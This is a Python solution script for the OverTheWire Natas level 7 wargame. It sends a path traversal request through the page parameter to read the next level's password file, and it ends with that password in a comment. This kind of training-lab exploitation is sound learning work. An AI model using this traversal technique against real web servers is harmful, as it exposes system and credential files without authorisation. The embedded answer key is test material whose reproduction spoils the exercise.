# natas7

import requests
from pwn import log
from bs4 import BeautifulSoup

url = 'http://natas7.natas.labs.overthewire.org'
username = "natas7"
password = "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS"
auth = (username, password)

def exploit():
    res = requests.get(f'{url}/index.php?page=/../etc/natas_webpass/natas8', auth=auth)
    log.info(res.text)
    soup = BeautifulSoup(res.text, 'html.parser')
    try:
        div = soup.find('div', {'id': 'content'})
        flag = div.get_text(separator='\n', strip=True)
        log.info(flag)
    except:
        log.error("div not found")
        exit(1)

if __name__ == '__main__':
    exploit()

# natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q